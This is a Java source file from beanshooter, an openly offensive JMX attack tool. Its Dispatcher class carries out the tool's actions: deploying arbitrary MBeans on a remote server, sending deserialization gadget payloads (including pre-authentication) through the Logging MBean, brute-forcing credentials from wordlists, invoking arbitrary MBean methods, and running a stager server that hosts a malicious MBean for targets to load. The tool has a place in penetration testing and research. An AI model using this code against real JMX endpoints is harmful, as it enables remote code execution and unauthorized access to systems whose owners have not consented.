package de.qtc.beanshooter.operation;

import java.io.IOException;
import java.util.Map;
import java.util.Scanner;
import java.util.Set;

import javax.management.AttributeNotFoundException;
import javax.management.MBeanException;
import javax.management.MBeanServerConnection;
import javax.management.ObjectInstance;
import javax.management.ObjectName;
import javax.management.ReflectionException;
import javax.management.RuntimeMBeanException;

import de.qtc.beanshooter.cli.ArgumentHandler;
import de.qtc.beanshooter.exceptions.AuthenticationException;
import de.qtc.beanshooter.exceptions.ExceptionHandler;
import de.qtc.beanshooter.exceptions.InvalidLoginClassException;
import de.qtc.beanshooter.io.Logger;
import de.qtc.beanshooter.io.WordlistHandler;
import de.qtc.beanshooter.mbean.IMBean;
import de.qtc.beanshooter.mbean.MBean;
import de.qtc.beanshooter.networking.StagerServer;
import de.qtc.beanshooter.plugin.PluginSystem;
import de.qtc.beanshooter.utils.Utils;

/**
 * The dispatcher class is responsible for dispatching the different beanshooter actions.
 * This class implements the main logic of the different beanshooter actions.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
public class Dispatcher {

    private MBeanServerClient client;
    private MBeanServerConnection conn;

    /**
     * Obtain an MBeanServer connection. The connection is created using the PluginSystem
     * and cached within the Dispatcher class. Followup calls will use the cached MBeanServerConnection.
     *
     * @return MBeanServerConnection to the remote MBeanServer
     */
    protected MBeanServerConnection getMBeanServerConnection()
    {
        if( conn == null )
            conn = getMBeanServerConnection(ArgumentHandler.getEnv());

        return conn;
    }

    /**
     * Obtain an MBeanServer connection.
     *
     * @return MBeanServerConnection to the remote MBeanServer
     */
    protected MBeanServerConnection getMBeanServerConnection(Map<String,Object> env)
    {
        String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
        int port = ArgumentHandler.require(BeanshooterOption.TARGET_PORT);

        return PluginSystem.getMBeanServerConnection(host, port, env);
    }

    /**
     * Obtain an MBeanServer connection. The connection is created using the PluginSystem
     * and cached within the Dispatcher class. Followup calls will use the cached MBeanServerConnection.
     *
     * @return MBeanServerConnection to the remote MBeanServer
     */
    protected MBeanServerClient getMBeanServerClient()
    {
        if( client != null )
            return client;

        if( conn == null )
            getMBeanServerConnection();

        client = new MBeanServerClient(conn);
        return client;
    }

    /**
     * Deploys the user specified MBean on the remote MBeanServer.
     */
    public void deploy()
    {
        Logger.printlnBlue("Starting MBean deployment.");
        Logger.lineBreak();
        Logger.increaseIndent();

        String mBeanClassName = ArgumentHandler.require(BeanshooterOption.DEPLOY_BEAN_CLASS);
        ObjectName mBeanObjectName = Utils.getObjectName(ArgumentHandler.require(BeanshooterOption.DEPLOY_BEAN_NAME));

        MBeanServerClient mBeanServerClient = getMBeanServerClient();
        mBeanServerClient.deployMBean(mBeanClassName, mBeanObjectName, BeanshooterOption.DEPLOY_JAR_FILE.getValue());

        Logger.decreaseIndent();
    }

    /**
     * Removes the specified MBean from the remote MBeanServer.
     */
    public void undeploy()
    {
        ObjectName mBeanObjectName = Utils.getObjectName(ArgumentHandler.require(BeanshooterOption.UNDEPLOY_BEAN_NAME));

        MBeanServerClient mBeanServerClient = getMBeanServerClient();
        mBeanServerClient.unregisterMBean(mBeanObjectName);
    };

    /**
     * Enumerate common vulnerabilities on the targeted JMX server.
     */
    public void enumerate()
    {
        boolean access = false;

        String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
        int port = ArgumentHandler.require(BeanshooterOption.TARGET_PORT);

        EnumHelper enumHelper = new EnumHelper(host, port);

        if( BeanshooterOption.CONN_USER.notNull() && BeanshooterOption.CONN_PASS.notNull())
            access = enumHelper.login();

        else if(BeanshooterOption.CONN_JMXMP.getBool())
            access = enumHelper.enumSASL();

        else
            access = enumHelper.enumAccess();

        Logger.lineBreak();
        enumHelper.enumSerial();

        if (!access)
            return;

        Logger.lineBreak();
        Set<ObjectInstance> mbeans = enumHelper.enumMBeans();
        MBean.performEnumActions(mbeans);
    }

    /**
     * The serial action performs an deserialization attack on the remote MBeanServer. It uses the
     * getLoggerLevel function for this purpose, as it expects an arbitrary Object as argument.
     */
    public void serial()
    {
        Logger.println("Attemting deserialization attack on JMX endpoint.");
        Logger.lineBreak();
        Logger.increaseIndent();

        Object payloadObject = ArgumentHandler.getInstance().getGadget();

        try
        {
            if (BeanshooterOption.CONN_JMXMP.getBool())
                SerialHelper.serialJMXMP(payloadObject);

            if (BeanshooterOption.SERIAL_PREAUTH.getBool())
                SerialHelper.serialPreauth(payloadObject);

            else
            {
                MBeanServerClient mBeanServerClient = getMBeanServerClient();
                ObjectName loggingMBean = Utils.getObjectName("java.util.logging:type=Logging");

                mBeanServerClient.invoke(loggingMBean, "getLoggerLevel", payloadObject);
            }

        } catch ( MBeanException | ReflectionException  e) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof ClassNotFoundException)
                ExceptionHandler.deserialClassNotFound((ClassNotFoundException)t);

            else
                Logger.eprintlnMixedYellow("Encountered unexpected", t.getClass().getName(), "after the payload object was sent.");

            ExceptionHandler.showStackTrace(e);

        } catch (RuntimeMBeanException | SecurityException e) {

            Throwable t = ExceptionHandler.getCause(e);
            Logger.eprintlnMixedYellow("Caught", t.getClass().getName(), "after the payload object was sent.");

            if( t instanceof IllegalArgumentException || t instanceof SecurityException )
                Logger.eprintlnMixedBlue("Payload object probably", "worked anyway.");

            ExceptionHandler.showStackTrace(e);

        } catch( java.rmi.UnmarshalException e) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof ClassNotFoundException)
                ExceptionHandler.deserialClassNotFound((ClassNotFoundException)t);

            else
                Logger.eprintlnMixedYellow("Encountered unexpected", t.getClass().getName(), "after the payload object was sent.");

            ExceptionHandler.showStackTrace(e);

        }

        catch (AuthenticationException e)
        {
            Throwable t = ExceptionHandler.getCause(e.getOriginalException());

            if( t instanceof ClassNotFoundException)
                ExceptionHandler.deserialClassNotFound((ClassNotFoundException)t);

            else if( e instanceof InvalidLoginClassException)
                Logger.printlnMixedRed("Server appears to be", "not vulnerable", "to preauth deserialization attacks.");

            else
                ExceptionHandler.unexpectedException(e, "deserialization", "attack", false);
        }

        catch (IOException e)
        {
            Throwable t = ExceptionHandler.getCause(e);

            if (t instanceof ClassNotFoundException)
                ExceptionHandler.deserialClassNotFound((ClassNotFoundException)t);

            else
                Logger.eprintlnMixedYellow("Encountered unexpected", t.getClass().getName(), "after the payload object was sent.");

            ExceptionHandler.showStackTrace(e);
        }
    };

    /**
     * Attempt to bruteforce valid credentials on the targeted JMX endpoint.
     */
    public void brute()
    {
        String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
        int port = ArgumentHandler.require(BeanshooterOption.TARGET_PORT);

        Logger.printlnMixedYellow("Reading wordlists for the", "brute", "action.");
        Logger.increaseIndent();

        Map<String,Set<String>> bruteMap = WordlistHandler.getCredentialMap();

        Logger.decreaseIndent();
        Logger.lineBreak();

        CredentialGuesser guesser = new CredentialGuesser(host, port, bruteMap);
        guesser.startGuessing();
    };

    /**
     * List available MBeans on the remote MBeanServer.
     */
    public void list()
    {
        MBeanServerClient mBeanServerClient = getMBeanServerClient();
        Set<ObjectInstance> instances = mBeanServerClient.getMBeans();

        Logger.println("Available MBeans:");
        Logger.lineBreak();
        Logger.increaseIndent();

        for(ObjectInstance instance : instances)
        {
            if( BeanshooterOption.LIST_FILTER_CLASS.notNull() &&
                !instance.getClassName().toLowerCase().contains(BeanshooterOption.LIST_FILTER_CLASS.getValue()))
            {
                continue;
            }

            if( BeanshooterOption.LIST_FILTER_OBJ.notNull() &&
                !instance.getObjectName().toString().toLowerCase().contains(BeanshooterOption.LIST_FILTER_OBJ.getValue()))
            {
                continue;
            }

            Logger.printMixedYellow("-", instance.getClassName(), "");
            Logger.printlnPlainBlue("(" + instance.getObjectName().toString() + ")");
        }

        Logger.decreaseIndent();
    };

    /**
     * Invoke a method on an MBean. This allows the user to manually specify an object name, a method name
     * and the desired arguments and invokes the corresponding call on the MBeanServer.
     */
    public void invoke()
    {
        ArgumentHandler.requireAllOf(BeanshooterOption.INVOKE_METHOD_ARGS, BeanshooterOption.INVOKE_OBJ_NAME, BeanshooterOption.INVOKE_METHOD_NAME);

        ObjectName objectName = Utils.getObjectName(ArgumentHandler.require(BeanshooterOption.INVOKE_OBJ_NAME));
        String methodName = ArgumentHandler.require(BeanshooterOption.INVOKE_METHOD_NAME);
        String argumentString = ArgumentHandler.require(BeanshooterOption.INVOKE_METHOD_ARGS);

        Object[] argumentArray = PluginSystem.getArgumentArray(argumentString);
        MBeanServerClient client = getMBeanServerClient();

        try
        {
            Object result = null;

            if(methodName.startsWith("get") && !BeanshooterOption.INVOKE_LITERAL.getBool())
                result = client.getAttribute(objectName, methodName.substring(3));

            else
                result = client.invoke(objectName, methodName, argumentArray);

            if( result != null )
                PluginSystem.handleResponse(result);
            else
                Logger.printlnBlue("Call was successful.");
        }

        catch (MBeanException | ReflectionException | AttributeNotFoundException | IOException e)
        {
            Logger.printlnMixedYellow("Caught", e.getClass().getName(), String.format("while invoking %s on %s.", methodName, objectName.toString()));
            Logger.println("beanshooter does not handle exceptions for custom method invocations.");
            ExceptionHandler.stackTrace(e);
        }
    }

    /**
     * Start the stager server and serve the MBean specified by the command line parameters.
     */
    public void stager()
    {
        int port = BeanshooterOption.STAGER_PORT.getValue();
        String host = BeanshooterOption.STAGER_HOST.getValue();

        StagerServer server = new StagerServer(host, port, true);

        String url = BeanshooterOption.DEPLOY_STAGER_URL.getValue(String.format("http://%s:%d", host, port));
        IMBean bean = de.qtc.beanshooter.mbean.mlet.Dispatcher.getMbean();

        server.start(url, bean.getJarName(), bean.getMBeanClass(), bean.getObjectName().toString());
        Logger.print("Press Enter to stop listening.");

        Scanner scanner = new Scanner(System.in);
        scanner.nextLine();
        scanner.close();

        server.stop();
    }
}
